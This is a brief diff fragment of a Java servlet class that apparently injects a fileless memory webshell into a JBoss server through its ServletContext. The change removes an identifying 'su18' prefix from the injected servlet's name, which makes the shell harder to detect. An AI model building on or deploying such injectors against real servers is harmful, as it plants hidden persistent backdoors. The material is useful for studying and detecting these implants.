@@ -23,7 +23,7 @@ public class JBSMSFromContext implements Servlet {
 
 	static {
 		try {
-			String servletName = "su18" + System.nanoTime();
+			String servletName = String.valueOf(System.nanoTime());
 
 			HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
 			ServletContext         context = request.getServletContext();
